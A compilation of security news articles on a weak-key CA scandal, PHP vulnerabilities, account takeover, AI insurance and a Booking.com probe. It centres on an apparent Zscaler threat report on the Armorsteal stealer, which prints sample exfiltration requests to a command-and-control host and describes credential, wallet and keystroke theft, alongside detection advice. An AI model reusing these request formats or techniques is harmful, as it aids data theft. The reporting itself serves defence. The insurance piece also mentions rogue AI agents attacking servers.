Title: Disgraced Indian cert issuer leaves the cert issuing business
Context: After embarrassing reports revealed weak private keys, one of which was just a single digit, Indian certification authority eMudhra has decided to take the L and get out of the...
Full Text: After embarrassing reports revealed weak private keys, one of which was just a single digit, Indian certification authority eMudhra has decided to take the L and get out of the global SSL/TLS cert game entirely. eMudhra announced Thursday that it was abandoning that arm of its business. Sure, the intense scrutiny heaped on the company was a factor, but the firm also argued that growing compliance costs and competition from free certificate providers had made the business increasingly difficult to justify. “Global SSL/TLS is a small part of eMudhra’s business contributing to about 1 percent of the global revenue,” the company explained, noting that free SSL/TLS cert issuance from large firms and increased compliance and data sovereignty requirements have made it a minor part of the firm’s operation, and one that doesn’t merit so much bad press. “The level of social media amplification around this incident has brought scrutiny that is out of proportion to SSL/TLS’s place in our business,” eMudhra explained. “In view of this, after detailed deliberations our board has concluded that withdrawing from global SSL/TLS is the right decision for eMudhra and its shareholders.” An argument could be made that, even if SSL/TLS accounts for just 1 percent of its global revenue, a private CA key with a value of 4 still deserves a thorough public shaming. It’s only been two days since eMudhra’s weak private keys were exposed in public reports, following a report to Mozilla on October 17, and it wasn’t exactly hard for security researchers to recover them: The eight affected private-key values ranged from the number 4 (yes – a plain old number 4), to 56 and 66, to the far more complicated 115, 155, 156, 230, and 237. No quantum computer required to crack those keys. Wow – better save the qubits. This wasn’t just an embarrassing collection of numbers, either: The weak keys belonged to eight intermediate certificate authorities, potentially allowing attackers to forge certificates trusted by systems that hadn’t blocked them. eMudhra, however, maintains that the affected CAs had issued no end-entity certificates. eMudhra quickly went on the defensive about its mind-boggling key-management failure, acknowledging the weak keys while pointing to independent audits and a problem during its key-generation ceremony that it said produced the weak keys alongside the intended strong ones. “A flaw in the key generation ceremony caused a wrap/unwrap step to produce a second set of weak keys alongside the original strong keys,” the company said the day after the key fiasco was reported. “The weak keys were the ones published to the browser root stores.” Despite that, eMudhra said the relevant certificate infrastructure had undergone two years of independent audits and had been in browser trust lists since mid-2025, raising questions about why the weak keys weren't caught sooner. eMudhra claimed on Thursday that the affected CAs had issued no end-entity certificates, that it had revoked those CAs within 14 hours of discovering the issue, and that neither its infrastructure nor its data had been compromised as a result of its key boo-boo. Still, the incident has given eMudhra another reason to shave off a small part of its business rather than continue facing scrutiny over its certificate operations. It’s still going to issue a root-cause report and fulfill its remaining commitments to browser root programs as it winds down the business. The company said it’ll continue to serve G1 RSA roots until it transitions customers to other certificate issuers, which it will do free of charge. “Revocation and certificate status services will keep running until every issued certificate has expired or been replaced,” the company said. ®

Title: SEO Poisoning Campaign Delivers New Armorsteal Malware
Context: This capability allows the threat actor to update the malware's embedded C2 domain list and configuration
Full Text: IntroductionIn September 2026, Zscaler Threat Hunting identified an SEO poisoning campaign that used fake websites impersonating the Chocolatey package manager and the Microsoft Activation Scripts (MAS) tool to distribute a Python-based malware family we track as Armorsteal. The fake websites targeted users searching for Chocolatey or MAS software installation commands. Each lure page displayed a malicious PowerShell command that downloaded and executed the Armorsteal installer. The installer deployed a Python 3.11 runtime environment and three main components providing remote access, surveillance, and information stealing capabilities, with the Python code protected by Pyarmor.The remote access component communicates with a command-and-control (C2) server, downloads additional modules, and executes remote tasks. The surveillance component logs keystrokes, monitors the clipboard, captures screenshots, and displays fake cryptocurrency wallet notifications. The information stealing component targets browser data, Discord tokens, cryptocurrency wallets, seed phrases, saved passwords, SSH keys, and Steam data.In this blog post, the Zscaler Threat Hunting team traces the campaign from poisoned search results through post-infection activity, including Armorsteal's components, C2 communication, and infrastructure changes observed during our analysis. Key TakeawaysIn September 2026, the Zscaler Threat Hunting team identified an SEO poisoning campaign that distributed Armorsteal through websites impersonating Chocolatey and the Microsoft Activation Scripts (MAS) tool.The SEO campaign targeted users searching for Chocolatey installation instructions or Microsoft activation scripts.The remote access component verifies RSA-2048 signatures on Python tasks received from the C2 server before executing them.The surveillance component records window titles, logs keystrokes, monitors copied cryptocurrency wallet addresses, and captures screenshots when configured keywords are detected.The information stealing component steals Discord tokens, browser cookies, saved passwords, cryptocurrency wallet data, BIP39 seed phrases, and SSH keys. Technical AnalysisThe following sections provide details about the malware distribution, capabilities, and network communications.SEO poisoningZscaler Threat Hunting identified two SEO poisoning lures that targeted users searching for Windows software installation instructions. One of those lures is shown in the figure below.Figure 1: Google search results for “chocolatey install windows”. Fake Chocolatey websiteThe first lure (seen in Figure 1) targets users looking for the Chocolatey package manager. A user searching for terms such as “install Chocolatey” and “Chocolatey PowerShell” may reach a typosquatted site impersonating chocolatey[.]org. The site displays a PowerShell installation command. When the user runs it, the malicious install.ps1 script downloads and installs the remote access module. The script also runs the legitimate Chocolatey installer, so Chocolatey appears to function as expected. The fake Chocolatey website and the malicious domain, choclatey[.]org, are shown below:Figure 2: Fake Chocolatey website distributing Armorsteal. Fake Massgrave websiteThe second lure targeted users searching for terms such as “Microsoft Activation Scripts,” “MAS activation script,” or “Massgrave activation”. These users may have reached massgravel[.]net, a malicious website impersonating the Microsoft Activation Scripts tool (a.k.a., the Massgrave project). The fake Massgrave website is shown in the figure below:Figure 3: Fake Massgrave website distributing Armorsteal.Although the two websites impersonate different projects and target different search queries, both deliver Armorsteal.ANALYST NOTE: The fake Massgrave website went down on September 25, 2026, and the fake Chocolatey website went down around October 1, 2026. Installation and persistenceBoth installer variants request elevated privileges, hide the PowerShell console window, and download a ZIP archive to C:\Windows\SystemHealth\Update\ to mimic a legitimate Windows system directory. The archive contains a Python 3.11 runtime, Pyarmor runtime files, and Armorsteal Python-based scripts.The installer creates the following scheduled tasks for persistence:Scheduled taskTriggerDescriptionSysCheck2User logonLaunches the remote access module with the highest privileges available.SysCheckXSystem bootLaunches the remote access module as SYSTEM after a 45-second delay.Table 1: Armorsteal scheduled task persistence.Anti-analysis techniquesArmorsteal uses the following techniques to avoid research environments and complicate analysis:The remote access module checks the public IP address and organization information using ipinfo[.]io. If the organization name returned matches a cloud provider such as Google, Amazon, Microsoft, or Azure, the module displays a fake “Memory is insufficient” message and exits. This can prevent the malware from running in some cloud-based analysis environments.The Python scripts are protected with Pyarmor 9.1.7 (trial version). Pyarmor encrypts Python bytecode and string constants, making static analysis and detection more difficult. The trial runtime is operationally useful to the threat actor because it provides code obfuscation without requiring a commercial Pyarmor license.Remote access moduleThe Armorsteal remote access module is stored as SysMon.py and is launched by the SysCheck2 and SysCheckX scheduled tasks. The module collects information about the infected system, including the hostname, operating system, processor, memory, disks, local IP address, public IP address, and network interfaces. It uses the motherboard serial number to create a machine identifier used in C2 communication.The remote access module also downloads and launches the surveillance and information stealing modules. The remote access module uses HTTPS and a hardcoded list of four C2 domains. It checks the availability of each domain before starting C2 communication. The C2 endpoints supported by the remote access module are shown in the table below:EndpointMethodDescription/downloadables/configf.jsonGETChecks whether the C2 server is available based on the HTTP status code 200./receive_infofPOSTSends device information to the C2 server./get-onetime-code/{machine_id}GETRequests a task for an individual victim./get-globalGETRequests a task shared across all infected systems./downloadables/{archive}GETIn earlier builds, downloads the remote access module updates along with the surveillance and information stealing modules.Table 2: The remote access module C2 endpoints.The following example shows the format of the HTTP POST request the remote access module uses to send system information to its C2 server. POST /receive_infof HTTP/1.1 Host: workerstats[.]net User-Agent: python-requests/2.31.0 Content-Type: application/json Content-Length: {CONTENT_LENGTH} { "host_name": "{HOSTNAME}", "ip_address": "{LOCAL_IP}", "public_ip_address": "{PUBLIC_IP}", "mac_address": "{MAC_ADDRESS}", "system": "{WINDOWS_VERSION}", "machine": "{MACHINE_ARCHITECTURE}", "memory": { "total": {TOTAL_MEMORY_SIZE}, "available": {AVAILABLE_MEMORY_SIZE}, "percent": {MEMORY_PERCENTAGE} } }The C2 server responds with the following message:{"message":"Data received and stored successfully"}The remote access module polls its C2 server every 60 seconds for both per-victim and global tasks. The malware verifies every task received using an embedded RSA-2048 public key before executing it. The per-victim task endpoint returns JSON containing Python code and a Base64-encoded signature, as shown in the format below:{ "code": "<Python source code>", "sig": "<Base64-encoded RSA signature>" }The global task endpoint returns a different response containing the # _ _SIGNED _ _: marker followed by the task data:# _ _SIGNED_ _:{"code":"aW1wb3J0IG9zCmltcG9ydCBzdWJwcm9jZXNz...", "sig":"fdWOAiJJ7qIowDnCEgO4LDd+s19RzzBjnKFQ9K447GXj..."}The remote access module uses a custom RSASSA-PKCS1-v1_5 signature verification routine before executing the task’s code in memory. After verifying a task's signature, it extracts an integer version number embedded in the Python code: ONETIME_VERSION for per-victim tasks and GLOBAL_VERSION for global tasks. The module compares this task version number with the last successfully executed version stored locally in its working directory, C:\Windows\SystemHealth\Update\. Task version numbers specific to a victim are stored in onetime_version.txt and global task versions are recorded in global_version.txt. The malware executes a task in memory only when its version is greater than the value in the corresponding file. The version number is then updated in the corresponding file. This prevents previously processed or older tasks from running again.The Armorsteal remote access module can also update itself through global tasks. These tasks can direct the malware to download a replacement SysMon.py file. The module first verifies the SHA256 of the downloaded file before replacing its local copy. This capability allows the threat actor to update the malware's embedded C2 domain list and configuration.Surveillance moduleThe surveillance component is named basrq.py and runs in a separate bundled Python interpreter in a ZIP archive, which is downloaded by the remote access module.The surveillance module performs the following activities:Logs keystrokes (with specialized handling for English, French, Spanish, and German), including backspace, space, decimal separators, and modifier keys.Records the title of the active window along with captured keystrokes.Monitors clipboard content every 0.5 seconds.Replaces copied cryptocurrency wallet addresses with attacker-controlled addresses.Captures screenshots when configured keywords appear in window titles or captured keystrokes.Displays fake transaction notifications that impersonate Exodus, MetaMask, and Phantom.The clipboard hijacker supports wallet addresses for Bitcoin, Litecoin, Monero, Ethereum, TRON, XRP, Dogecoin, TON, and Solana.The Armorsteal surveillance module uses the following C2 endpoints to retrieve monitoring keywords and upload collected data.EndpointMethodDescription/global_keywordsGETRetrieves campaign-wide monitoring keywords./keywords/{machine_id}GETRetrieves keywords for a specific infected system./black-watch/{machine_id}POSTUploads gzip-compressed keystroke logs./black-watch/screenshot/{machine_id}POSTUploads keyword-triggered screenshots.Table 3: The Armorsteal surveillance module C2 endpoints.The module retrieves keyword lists every 300 seconds. The observed lists include terms related to cryptocurrency wallets, exchanges, browser names, cloud services, and recovery phrase-related terms. Before uploading screenshots to /black-watch/screenshot/{machine_id}, the surveillance module encrypts their raw PNG bytes. The module computes the SHA256 digest of a hardcoded string and uses the resulting 32-byte value (c1146fbcaa433385839c25839a61cd7fedaff858cc0d3fd063dba68db2cf31b4) as an XOR key.The following example shows the Armorsteal surveillance module uploading the stolen data using the filename keylogs.gz:POST /black-watch/{machine_id} HTTP/1.1 Host: workerstats[.]net Content-Type: multipart/form-data Content-Disposition: form-data; name="keylogs"; filename="keylogs.gz" <gzip-compressed log data>Stealer moduleThe information stealing module’s script name is got.py, which is downloaded as a ZIP archive by the remote access module. This module collects data from web browsers, password managers, cryptocurrency wallets, Discord clients, and Steam installations. The stealer also collects system information, including geolocation, display information, language settings, time zone, and GPU details.The stealer module has the following capabilities:Steals and validates Discord tokens from 22 Discord client variants.Collects data from 21 browser wallet extensions and desktop wallet applications.Searches drives from A: through Z: for BIP39 seed phrases.Extracts browser cookies through the Chrome DevTools Protocol (CDP) on port 9222.Steals saved browser passwords, autofill data, and credit card metadata. To collect browser passwords, the module downloads and uses the public chrome-decryptor tool from the Chrome App-Bound Encryption Decryption project.Targets password manager data from KeePass, 1Password, RoboForm, Password Safe, Enpass, Bitwarden, and Dashlane.Collects SSH keys and Steam session data.The Armorsteal stealer module uses the following C2 endpoints to upload stolen data: EndpointMethodDescription/infame/receive/zipPOSTUploads the main stolen data archive./infame/receive/dtPOSTUploads Discord tokens and account information./ws/{machine_id}POSTUploads wallet files and seed phrases./pwdPOSTUploads saved browser passwords./upload/stPOSTUploads Steam account information.Table 4: Armorsteal stealer module C2 endpoints.The main information stealing component archive contains a system profile and browser cookie files. Threat Actor InfrastructureZscaler Threat Hunting identified Armorsteal lure and C2 domains registered on the dates shown in the table below. Shared malware components and an RSA-2048 task-signing key link the Chocolatey and Massgrave lures to the same operation.DomainPurposeRegistration DateRegistrarworkerstats[.]netPrimary C2January 28, 2026NICENICdatamons[.]orgStandby C2May 19, 2026NameSilosupertrap[.]netStandby C2August 29, 2026NameSilomassgravel[.]netFake Massgrave lureAugust 30, 2026NICENICchoclatey[.]orgFake Chocolatey lureSeptember 1, 2026Key-Systemsniceer[.]netStandby C2September 1, 2026NICENICTable 5: Armorsteal lure and C2 domain registration details.Zscaler Threat Hunting observed two phases of the campaign’s infrastructure changes during the analysis period. In the first phase (early September 2026), the fake Chocolatey website and its subdomains were hosted at 209.99.186[.]187, an SKN Subnet & Telecom server. At this time, workerstats[.]net was protected by Cloudflare and resolved to 104.21.87[.]146.In mid-September 2026, the operator moved the Chocolatey and Massgrave lure websites to 82.153.135[.]80, hosted by AKILE LTD in the United Kingdom. The primary C2 domain, workerstats[.]net, also moved from Cloudflare to 186.2.175[.]183, hosted by IQWeb FZ-LLC and using DDoS-Guard name servers.During continued monitoring (early October 2026), Zscaler Threat Hunting observed further changes to Armorsteal’s C2 infrastructure. The previously used domain, workerstats[.]net, became unavailable, and the threat actor began using pymons[.]is and the previously dormant domain datamons[.]org as C2 servers. The threat actor subsequently changed how the surveillance and information stealing modules were downloaded. Previously accessible through the C2 server’s /downloadables/ path, the packages now require a token in the request URL and an X-Verify header containing the correct token. Requests use /C2/?t=[token]451 for surveillance and /C2/?t=[token]452 for information stealing. Successful requests retrieve ZIP packages from /p/[32hex].zip, with randomized filenames. Remediations And Detection OpportunitiesFor organizations that suspect exposure to this campaign, we recommend the following actions:Investigate systems for SysCheck2 and SysCheckX scheduled tasks.Hunt for files and directories under C:\Windows\SystemHealth\Update\.Review PowerShell logs for downloads from choclatey[.]org, community[.]choclatey[.]org, and massgravel[.]net.Block the verified malicious lures and C2 domains.Review outbound HTTPS traffic for /receive_infof, /get-global, /black-watch/, and /infame/receive/ where URL paths are visible in your telemetry.Review endpoint telemetry for browser processes started with --remote-debugging-port=9222.Remove unauthorized Microsoft Defender exclusions, particularly exclusions for C:\Windows.Educate users to verify software download websites and PowerShell installation commands before execution. ConclusionArmorsteal is a Python-based malware family distributed through an active SEO poisoning campaign that uses fake Chocolatey and Massgrave websites. The campaign deploys modules for remote access, cryptocurrency theft, clipboard hijacking, and credential stealing. The shared malware components, task-signing key, and C2 infrastructure link both lures to the same operation. Although the operator changed hosting and package filenames during our analysis, the core malware components remained unchanged. The Zscaler Threat Hunting team continues to monitor the campaign for infrastructure and payload changes. Title: PHP2Shell puts dozens of UK government services out of service
Context: The PHP2Shell security fiasco has forced 32 UK government services offline and left another four partially unavailable as Whitehall scrambles to patch the critical...
Full Text: The PHP2Shell security fiasco has forced 32 UK government services offline and left another four partially unavailable as Whitehall scrambles to patch the critical vulnerabilities wreaking havoc across the web. The figures were disclosed in the House of Lords on Thursday, where tech minister Baroness Lloyd of Effra outlined the disruption following the discovery of two critical flaws in PHP. "Currently, the information I have is that 32 government services are unavailable and four are partially unavailable," Lloyd told peers. "That has resulted largely from precautionary measures taken to protect systems while security updates and mitigations are applied." "We are working very carefully with departments to restore the services safely and securely following that remediation activity," she added. Whitehall has not published a full list of affected services, although the Office for Budget Responsibility (OBR) is among those known to have taken their websites offline, rather inconveniently with next week's Budget looming. Peers also raised reports of disruption affecting the DVLA and police services. Britain isn't alone in pulling the plug. Government websites in Germany, France, Belgium, Finland, and the Netherlands have also been taken offline as a precaution, along with Australia's own cybersecurity agency website. Across the Atlantic, the NSA has urged organizations to patch or disconnect vulnerable systems, although the US government has not publicly confirmed any website shutdowns. PHP2Shell comprises two critical vulnerabilities, CVE-2026-109618 and CVE-2026-109619, that could allow unauthenticated attackers to execute code on vulnerable servers. The National Cyber Security Centre (NCSC) warned organizations to patch immediately or consider pulling affected systems offline until they could be fixed. "The NCSC was briefed by OpenAI last week on this potential specific vulnerability and has been working to ensure that disclosure happened in a co-ordinated way with vendors, so there was sufficient preparation to protect customers," Lloyd said. Security firm Calif found one of the PHP bugs using OpenAI's GPT-5.6 Sol model, while Google's Wiz separately uncovered both flaws with the help of AI tools. OpenAI then dug into the vulnerabilities itself and worked with vendors and government agencies to get the word out. The government established a cross-departmental incident response operation before public disclosure, Lloyd said. The NCSC also sent 50,000 warnings to businesses and other organizations. The disruption has spread beyond central government. Liberal Democrat peer Baroness Ludford pointed to several councils whose services had reportedly been taken offline, including Edinburgh, Oxford, Bristol, Lambeth, and Barnet. She questioned why central government and local authorities remain outside the statutory duties proposed under the government's Cyber Security and Resilience Bill, which returns to the Lords on Monday. "We are not currently aware of any confirmed compromise of central government systems resulting from these vulnerabilities," Lloyd told peers, later extending that assessment to the wider UK public sector. AWS says attackers were exploiting the flaws four days before they were publicly disclosed, while Cloudflare has since recorded millions of attempts to weaponize them. ®

Title: When the attacker becomes the user: Rethinking account takeover
Context: The power of this partnership comes from INKY’s ability to stream real-time email security telemetry into SaaS Alerts, including inbound analysis results and threat detections,...
Full Text: In a world full of cyber risk, account takeover has emerged as one of the most insidious of all threats. If an attacker can successfully compromise a legitimate email account, they are then able to pose as a trusted individual or organization without triggering any warnings. Traditional email security will see nothing wrong. From there the threat actor can pick their moment to cause havoc with objectives that range from stealing money, expropriating sensitive data and propagating catastrophic malware. Serious financial loss and a damaged corporate reputation are commonplace outcomes. The typical account takeover lifecycle starts with the bad guys obtaining credentials, usually through the medium of phishing. Generative AI (GenAI) has made it easy for an attacker to trick an unwary individual into giving away login data, perhaps by posing as a colleague or other trusted party or by encouraging them to enter confidential information on a fake login page. You might expect, once a legitimate identity has been successfully compromised, that all hell would immediately break loose. These days the typical account takeover artist is more stealthy and sinister than that, in no rush to act at this early stage since no alarm bells have been triggered. Most will take their time to test out and verify their stolen login data, and see where it might take them. “Conventionally attackers would take over an account and immediately start firing off spam and phishing,” says Dave Baggett, SVP Cybersecurity with software developer Kaseya. “Now they are starting to get clever. They’ll get access to an account and sit tight, watching all the email traffic passing and waiting for an opportune moment to inject themselves into the conversation.” From the inside out Once they’ve figured out an organisation’s weak points and come up with a plan of attack, the bad guys will start to weaponize the compromised email account to target other employees and internal systems. Assuming their motivation is financial, they might be on the hunt for a way into payroll or invoicing databases. But their ultimate aim might lie further afield in the form of the organisation’s customers and suppliers, and that’s when the real nightmare can start. So called outbound phishing offers the criminal a way to assert control over a whole new range of sensitive end points. Victims of outbound phishing are highly vulnerable in the face of what seem to be messages from a trusted partner and ally. It is one thing for an organisation to protect its own email accounts with robust controls like multifactor authentication (MFA), but no one has control over the authentication practices of other parties: “Let’s say we have a customer who we’re protecting,” explains Baggett. “They’re safe, but imagine that they start getting suspicious emails from a third party. Our customer has no idea what is or isn’t protecting that third party. Emails coming from that source might appear to be from a real account, but it could be a hacker typing them.” Given that you can’t run checks on third party organisations, something more sophisticated than regular email security is required. Ideally this would be a GenAI-powered solution that can bring language understanding to bear, able to examine conversation histories in depth to see if something anomalous can be spotted. It makes life even harder for defenders when the bad actor has successfully assumed the identity of somebody senior. If they are impersonating a top-tier manager with an extensive and trusted reputation then they have a powerful asset on their hands. All the trust and goodwill of that senior individual is now inherited by the criminal. Conventional email filtering systems will often be configured to allow senior personnel past certain defensive layers with minimal friction, so as not to restrict important business communications. Recipients of mail from such sources may be disinclined to challenge and report them, should suspicions be raised by the nature of what they are asking for. It takes a bold employee to call out as fraud what seems to be a message from somebody at C-level, especially when the email system has apparently green lighted it as authentic. Bringing the power of AI to bear The heat is on not just for IT departments but for MSPs who have multiple organisations under their protection, many of which will have no real in-house security knowledge of their own. Kaseya’s own research shows just how exposed many are. New approaches are needed that deal with the menace of account takeover before damage can be caused. And should a takeover transpire, consideration must be given to containing its impact before vital data and infrastructure are affected. The good news is that modern tools exist that perform just these tasks. INKY is Kaseya's generative AI-driven email analysis tool. It has capabilities that go well beyond any kind of traditional email security, tuned to detect, through the most subtle and marginal signs, when an email conversation is in the process of being infiltrated. Using techniques such as advanced sender profiling, stylometry and machine learning, INKY is adept at identifying inconsistencies between the known writing patterns of a legitimate employee and the slightly unfamiliar tone of a fake message. It can sniff out that something is wrong, even when message headers seem real, just by spotting the kind of contextual anomalies that expose a phoney message. INKY is especially useful when it comes to third party account takeover. It achieves this by building and maintaining detailed profiles of trusted senders based on technical and behavioural characteristics. Over time it learns what “normal” looks like and can see when a third-party email doesn’t match a sender’s established profile. Containing an attack If a takeover attempt has been successful, there’s more to stemming the damage than just putting a block on a suspect account. By the time of its discovery, a compromised identity may have already led to inroads being made into connected SaaS apps, cloud storage and collaboration tools, widening the possible blast zone well beyond a single email thread. Modern IT environments are a jungle of identity-driven endpoints and gateways, and therefore increasingly difficult to defend against intruders armed with legitimate credentials. To compound matters, when the bad guys have AI at their disposal they are able to treat these SaaS-driven ecosystems as a single attack surface. Defence that relies on a patchwork of individual tools, each created to solve a particular challenge in one silo of the organisation, will not be up to countering this kind of threat. That’s why INKY is configured to work with Kaseya SaaS Alerts, a cloud-based detection and response platform designed to help MSPs and others to monitor and protect business applications. Once INKY has picked up that a mailbox has been hijacked, it isolates the user and blocks outbound mail. It then sends an event to SaaS Alerts so that it can lock down that user's access across the rest of the stack. The tools work as a team, INKY blocking the compromised account and SaaS Alerts preventing the damage from spreading. The power of this partnership comes from INKY’s ability to stream real-time email security telemetry into SaaS Alerts, including inbound analysis results and threat detections, user-reported phishing activity and outbound mail protection events. This type of integration helps to automate real-time threat detection across a complex SaaS ecosystem. “It means if we see suspicious mail going out, we can shut the account down, and take other remedial actions,” says Baggett. “The more you understand the meaning of the mail, the more you can catch.” Smart tools to the rescue The battle against account takeover is never won, and future innovation is always needed. We’ve seen how AI is a dangerous weapon in the hands of the attacker. It’s also a very handy tool for the defender – but there are some qualifications: “You can’t just put every inbound and outbound mail through an LLM since the economics don’t add up,” points out Baggett. “You’ve got to be more clever than that.” One of the most important and cleverest emerging uses for GenAI lies in not simply protecting against account takeover but predicting where weakness might lie, helping to stop a problem before it happens. Baggett believes that the security industry is at the very beginning of being able to use models to predict in this way. An essential preliminary is making sure the many different components that go into securing an organisation can share information with each other. That integration work is underway, an early example being the real time dialogue between INKY Mail Protection System and SaaS Alerts. Next step is a unified data layer where any security component can publish an event in real time, and any other component can subscribe. “We’ll continue to make more integrations of this sort over time,” promises Baggett. “We’re also building a centralised capability for AI. With so many of the different components having their own AI, you need an underpinning platform. We also have a service bureau of Machine Learning experts who can make customised models for different tasks. There’s no sleeping on the job. The volume of attacks is clearly going to increase.” Read more in Kaseya’s Cybersecurity Report here Sponsored by Kaseya

As AI Risks Grow, Insurers Split on Covering the Damage

Some build specialized agentic AI coverage, while major carriers quietly exclude it — leaving enterprises exposed without their knowledge.

Stephen Lawton,Contributing Writer

October 22, 2026

7 Min Read

Source: Mungkhood Studio via Shutterstock

Following a rash of data breaches this year, several insurance companies have begun offering proactive policies related to artificial intelligence (AI) to cover enterprises that might be targets of unprovoked attacks or the source of attacks from AI agents going rogue. Meanwhile, other carriers are intentionally side-stepping this emerging risk, leaving enterprises to figure out how to manage it.

Insuring an enterprise against attacks from rogue AI agents that attack the enterprise, or perhaps those created within the enterprise that breach the corporate environment and attack third parties, is uncommon coverage. Many enterprises mistakenly believe their cyber and liability insurance policies covers AI-related risks.

As corporate insurance policies get ready to renew at the end of the calendar year, CFOs, general and outside counsels, CISOs, and other corporate executives tasked with insurance responsibilities should be examining them closely to determine their current AI risks and identifying exclusions that might be baked in. This is also a good time to meet with insurers that offer AI-specific policies to learn what types of coverage are available that the existing policy does not cover. Insurers are warning that the increased use of AI and AI agents is not keeping pace with enterprises’ governance. Rogue AI incidents, like the recent Open AI attacks against Hugging Face and other servers, have only heightened insurers’ concerns.

Related:Rethinking Cybersecurity Awareness in the AI Era

Last year, insurance coverage specifically for AI-related losses was in its infancy. Carriers often included minimal coverage in generic Errors and Omissions (E&O) policies, Directors and Officers (D&O) liability insurance, or simply in the liability policy, but many of those policies are inadequate to address AI's actual risks.

Today, several specialty insurance firms have coverage for AI-related incidents, either as endorsements, language included in technology E&O policies, or as standalone policies. Among the insurance companies and specialty providers that sell purpose-built policies, affirmative endorsements, and specialized coverage targeting AI risks are Armilla, Coalition, Corgi Insurance, Cowbell, Munich Re, and Beazley.

However, several large carriers are restricting or excluding AI-related risks and autonomous machine behavior from commercial general liability policies, adopting the Verisk/ISO exclusion endorsements. The exclusions address gaps in policies that were written prior to generative AI becoming ubiquitous within enterprises, according to insurance industry trade publication Insurance Business. The ISO endorsement removes coverage for bodily injury, property damage, and personal and advertising injury arising from generative AI. Chubb, Travelers, Berkshire Hathaway, AIG, and W.R. Berkley are among those adopting this endorsement, according to the publiction.

Related:Trust Is Not What It Seems — and Fraudsters Are Counting on It

How to Qualify for AI-Specific Insurance

So how can companies protect themselves from possible losses from potential risks from rogue AI agents? Here's what you can do today to reduce risk and improve your ability to qualify for AI-specific insurance:

Review your existing cyber and corporate liability insurance to determine which AI-related losses are covered and where your security exposures remain.

Analyze your network infrastructure to determine whether you have sufficient guardrails, along with specific policies and procedures, for addressing incoming and outgoing AI agent attacks.

Have your general or outside counsel review third-party contracts to ensure your supply chain is protecting you from potential AI threats.

Require your supply chain partners to demand their supply chain partners are protected; enterprises need protections multiple levels back down the supply chain.

Have your engineering team determine the different design patterns and architectural principles your vendors are using to build their AI applications. Not all AI development is compatible and responds to security software the same way; treating incompatible architectural principles the same could leave security gaps.

Be sure your AI applications have the minimum system rights and credentials required to do their jobs.

Treat Agentic AI as you would service accounts or endpoint detection and response systems. They're not "set them and forget them." They need to be monitored and maintained.

AI is not a panacea for every problem a company might face. It is a tool with specific use cases and configurations. If you use it as a catch-all for whatever ails your network, you will be compromised. Only use AI for specific tasks for which you have written rules, expectations, and results, and then ensure the AI applications are meeting those specific goals.

Related:Security Threats Don't Stop at the Office: Why Executives' Families Need Training, Too

What Coverage Looks Like in Non-Cyber Policies

Coverage for AI-based risks sometimes fall outside the purview of cyber insurance coverage. Because of AI's ubiquity in the enterprise, coverages for its potential failures likely will appear in other specialties as well.

For example, AI is used extensively by human resources departments in enterprises as a hiring tool, says Andrew Correll, head of underwriting for Armilla, a Lloyd's coverholder writing policies for the London syndicate. Coverage for AI tools that hallucinate or display a bias that triggers an insurable event might well be included in the enterprise's liability coverage or in coverage specific to use cases that are separate from a dedicated cyber insurance policy, he adds.

AI coverage addresses more than just a corporate computer being attacked and completely disabled, notes Craig Linton, AI and Emerging Risk Strategy Lead at Beazley. In some cases, a system only needs to be purged of unwanted data brought in by an AI agent. Taking systems offline for that purpose could interrupt business operations but is different than a common malware attack that forces the system to go offline or fail, which is a covered event. Beazley offers dedicated policies for defenses against the attack and endorsements that he calls "AI voluntary shutdown coverage," Linton says.

In order for enterprises to qualify for AI-related coverage, underwriters "look at the body of controls holistically," Correll says.

"Human review is obviously a component of that," he says. "But we also look for what kind of guardrails and rules are in place."

The Beazley application for AI coverage includes dozens of questions focusing on roughly 15 security controls, Linton notes. While most of the security controls are essential for cyber insurance coverage ­— multifactor authentication, backup and recovery, and training and network protection — the carrier also includes inquires about operational technology security, mergers and acquisitions, and Payment Card Industry (PCI) security.

He cautions teams buying AI insurance ­— often the general or outside counsel, chief financial officer and senior executives ­— that employees might be using unsupervised AI on their corporate and personal devices. Like similar shadow IT challenges companies faced in years past, employees will turn to shadow AI they can obtain easily and inexpensively if the tools are not provided by their employer and secured by the IT team. With AI, he says, this can introduce significant risks.

One challenge several sources mentioned is addressing the common problem of generative AI large language models (LLMs) hallucinating and displaying bias. For Corgi Insurance, coverage for hallucinated, inaccurate, or biased model outputs may fall under the Technology E&O policy/Generic Tech E&O policies written before generative AI technologies were widespread could be silent or ambiguous about how they treat model outputs. The company recommends looking for explicit AI-output language and reviewing algorithmic-bias exclusions carefully. When selecting an AI-centric policy, the proverbial devil is in the details, says Jack Kudale, co-founder and CEO of Cowbell. Does the policy wording address a nonmalicious system failure? Does it address an unauthorized disclosure without any external intrusion? Does that fall within a cyber coverage? Does it fall in a technology errors and omission, or does it in a completely different risk altogether? Questions like these will determine whether the policy or rider will address the threat the enterprise is trying to insure against or whether there is a possible exclusion, such as the Verisk/ISO exclusion endorsements and similar limitations employed by the top-tier insurers. If an exclusion is found in an existing policy during a corporate review, the enterprise then can purchase specialty coverage to mitigate that risk.

Protecting your enterprise from potential rogue AI agents and other AI risks requires that enterprises proactively ensure that three risk areas are protected: infrastructure, data pipelines, and your supply chain, Kudale says.

Protecting the infrastructure includes making sure that you have no misconfigured servers, overpermissioned identities, or exposed public endpoints. Safeguarding the data pipelines includes ensuring the storage architecture is secured from breaches, compromises, and poor decision-making, he adds. Finally, organizations need to secure their supply chain well beyond their direct vendors. Threats can come from secondary, tertiary, or further back in the supply chain.

"It's one thing we worry about the most," Kudale says. "We don't worry about hallucination and bias as much as others. We worry about supply chain more."

Full Text:
The European Commission has opened an investigation Booking.com for possible security failings that have resulted in fraudulent listings and phishing scams.

The investigation will ascertain whether the online travel agency has breached security and transparency provisions contained in the EU’s Digital Services Act (DSA).

Among the focus areas of the investigation, the Commission will assess whether Booking.com has diligently assessed and mitigated phishing risks to customers. This includes looking at how the firm shares reservation and guest data is shared with accommodation providers, and the safeguards it has in place to prevent such data being misused to carry out phishing and solicit fraudulent payments.

In addition, the Commission will focus on the design and functioning of Booking.com's messaging service, and its potential to be abused by malicious actors for phishing attacks.

Another focus is whether the provider of Booking.com has properly assessed and mitigated the systemic risks linked to the dissemination of illegal content, such as impersonation fraud and non-compliant accommodation.

The firm’s advertising practices will also be assessed to determine whether it meets the DSA's advertising transparency obligations.

If it is determined that the company failed to comply with the DSA in these areas, Booking.com could face a fine of up to 6% of their global annual turnover and be required to take corrective measures.

The DSA came into force in November 2022 and applies to Very Large Online Platforms (VLOPs) and Very Large Online Search Engines (VLOSEs).

The decision to launch formal proceedings against Booking.com, announced on October 21, follows a preliminary investigation carried out by the Commission.

